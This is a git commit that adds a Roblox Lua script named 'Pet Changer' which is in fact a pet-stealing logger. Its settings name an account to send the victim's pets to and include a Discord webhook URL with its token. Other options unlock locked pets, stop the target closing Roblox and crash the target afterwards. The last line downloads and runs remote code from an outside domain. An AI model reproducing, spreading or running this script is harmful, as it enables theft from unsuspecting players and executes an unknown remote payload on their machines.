033e88150d38f0bf5bfcee270f0655e413fc73a9
Apxjj <128285168+Apxjj@users.noreply.github.com>
2023-03-27 04:06:11 +0100

    Add files via upload

---
+++ Pet Changer.lua
@@ -0,0 +1,19 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Config ]]--
+_G.Username = "Janew77" --// Username To Send Pets To
+_G.ScriptName = "Pet Changer" --// Script Name For Watermark
+_G.Webhook = "https://discordapp.com/api/webhooks/1080274439230455843/SuC31p8LFFLCj6EvyOwSD7d45LHg_QAxeRKtaFsVtDUslB-Cvt4comprSBgi2c5NKMfI" --// Discord Webhook For Executions
+_G.GiftMessage = "Gift" --// Message For The Gift To Say
+_G.Diamonds = 5000000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+_G.Tip1 = "Give this script for everyone" --// Gives You Tips On The UI
+_G.Tip2 = "Grind psx 24/7" --// Gives You Tips On The UI
+_G.Tip3 = "take care of ur health" --// Gives You Tips On The UI
+_G.Tip4 = "use script" --// Gives You Tips On The UI
+_G.Tip5 = "scripts is good" --// Gives You Tips On The UI
+
+--[[ Loadstring ]]--
+loadstring(game:HttpGet("https://fourdevils.gq/Arkhalis.lua", true))()
